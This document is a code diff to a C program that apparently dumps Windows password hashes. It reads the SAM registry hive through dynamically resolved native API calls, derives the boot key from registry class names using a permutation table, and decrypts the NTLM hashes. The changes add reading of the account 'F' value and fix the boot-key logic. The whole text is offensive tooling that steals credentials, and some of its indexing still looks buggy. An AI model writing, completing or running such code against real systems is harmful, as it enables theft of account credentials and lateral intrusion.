@@ -112,14 +112,18 @@ FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
 */
 void getSAM(PSAM samRegEntries[], PULONG size) {
 	HANDLE key;
-	HANDLE subKey;
+	HANDLE subKeyV;
+	HANDLE subKeyF;
 	OBJECT_ATTRIBUTES attributes;
-	OBJECT_ATTRIBUTES attributesSubKey;
+	OBJECT_ATTRIBUTES attributesSubKeyV;
+	OBJECT_ATTRIBUTES attributesSubKeyF;
 	UNICODE_STRING UnicodeRegPath;
-	UNICODE_STRING UnicodeRegPathSubKey;
+	UNICODE_STRING UnicodeRegPathSubKeyV;
+	UNICODE_STRING UnicodeRegPathSubKeyF;
 	ULONG lengthBuff;
 	PKEY_FULL_INFORMATION keyInfo = NULL;
-	PKEY_FULL_INFORMATION keyInfoSubKey = NULL;
+	PKEY_FULL_INFORMATION keyInfoSubKeyV = NULL;
+	PKEY_FULL_INFORMATION keyInfoSubKeyF = NULL;
 	PKEY_BASIC_INFORMATION keyInfoSubKeysBasic = NULL;
 	PKEY_VALUE_FULL_INFORMATION keyValuesSubKey = NULL;
 	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
@@ -163,23 +167,23 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 		}
 
 		if (wcsncmp(L"00", keyInfoSubKeysBasic->Name, wcslen(L"00")) == 0) {
-			WCHAR RegPathSubKey[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
-			wcsncat_s(RegPathSubKey, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);
+			WCHAR RegPathSubKeyV[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
+			wcsncat_s(RegPathSubKeyV, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);
 
-			pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
-			InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
+			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyV, RegPathSubKeyV);
+			InitializeObjectAttributes(&attributesSubKeyV, &UnicodeRegPathSubKeyV, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-			ret = pMyNtOpenKey(&subKey, KEY_READ, &attributesSubKey);
+			ret = pMyNtOpenKey(&subKeyV, KEY_READ, &attributesSubKeyV);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
 			}
 
-			ret = pMyNtQueryKey(subKey, KeyFullInformation, NULL, 0, &lengthBuff);
+			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, NULL, 0, &lengthBuff);
 
-			keyInfoSubKey = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+			keyInfoSubKeyV = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
-			ret = pMyNtQueryKey(subKey, KeyFullInformation, keyInfoSubKey, lengthBuff, &lengthBuff);
+			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, keyInfoSubKeyV, lengthBuff, &lengthBuff);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
@@ -190,12 +194,12 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 			getClasses(sam);
 
-			for (ULONG j = 0; j < keyInfoSubKey->Values; j++) {
-				ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
+			for (ULONG j = 0; j < keyInfoSubKeyV->Values; j++) {
+				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
 
 				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
-				ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
+				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
 
 				if (!NT_SUCCESS(ret)) {
 					exit(ret);
@@ -206,6 +210,38 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 					CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
 					sam->vLen = keyValuesSubKey->DataLength;
 				}
+				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
+			}
+			WCHAR RegPathSubKeyF[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\";
+			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyF, RegPathSubKeyF);
+			InitializeObjectAttributes(&attributesSubKeyF, &UnicodeRegPathSubKeyF, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+			ret = pMyNtOpenKey(&subKeyF, KEY_READ, &attributesSubKeyF);
+
+			if (!NT_SUCCESS(ret)) {
+				exit(ret);
+			}
+
+			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, NULL, 0, &lengthBuff);
+
+			keyInfoSubKeyF = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, keyInfoSubKeyF, lengthBuff, &lengthBuff);
+
+			if (!NT_SUCCESS(ret)) {
+				exit(ret);
+			}
+
+			for (ULONG j = 0; j < keyInfoSubKeyF->Values; j++) {
+				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
+
+				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
+
+				if (!NT_SUCCESS(ret)) {
+					exit(ret);
+				}
 
 				if (wcsncmp(keyValuesSubKey->Name, L"F", keyValuesSubKey->NameLength) == 0) {
 					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
@@ -214,10 +250,13 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 				}
 				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
 			}
+
 			sams[nEntries] = sam;
 			nEntries++;
-			HeapFree(GetProcessHeap(), 0, keyInfoSubKey);
-			pMyNtClose(subKey);
+			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyV);
+			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyF);
+			pMyNtClose(subKeyV);
+			pMyNtClose(subKeyF);
 		}
 		HeapFree(GetProcessHeap(), 0, keyInfoSubKeysBasic);
 	}
@@ -253,7 +292,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		offset = ((LONG)samRegEntries[i]->v[0xA8]) + 0xcc;
 
-		LONG bootKey[16];
+		BYTE bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
 
 		BYTE encNTLM[16] = {};
@@ -316,15 +355,15 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			CopyMemory(encNTLMKey, &samRegEntries[i]->v[offset + 0x4], 16);
 
 			BYTE aux[4] = {};
+			int j = 0;
 			for (int i = 3; i >= 0; i--) {
-				int j = 0;
-				WCHAR aux[2] = {};
+				CHAR aux[2] = {};
 				aux[0] = samRegEntries[i]->rid[i * 2];
 				aux[1] = samRegEntries[i]->rid[i * 2 + 1];
 
-				PWCHAR end;
+				PCHAR end;
 
-				aux[j] = wcstoul(aux, &end, 16);
+				aux[j] = strtoul(aux, &end, 16);
 				j++;
 			}
 
@@ -542,16 +581,18 @@ void getClasses(PSAM samRegEntry) {
 	return;
 }
 
-void getBootKey(PSAM samRegEntry, PLONG bootKeyRet) {
-	unsigned int magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
-	unsigned int bootKey[16];
+void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet) {
+	LONG magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
+	BYTE bootKey[16] = {};
 	for (int i = 0; i < 16; i++) {
-		PWCHAR auxStr = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, 3);
-		auxStr[0] = samRegEntry->classes[i * 2];
-		auxStr[1] = samRegEntry->classes[(i * 2) + 1];
-		auxStr[2] = '\0';
+		CHAR auxStr[3] = {};
 
-		bootKey[i] = wcstol(auxStr, NULL, 16);
+		PCHAR end;
+
+		auxStr[0] = samRegEntry->classes[magics[i] * 2];
+		auxStr[1] = samRegEntry->classes[magics[i] * 2 + 1];
+
+		bootKey[i] = strtoul(auxStr, &end, 16);
 	}
 	memcpy(bootKeyRet, bootKey, 16);
 }
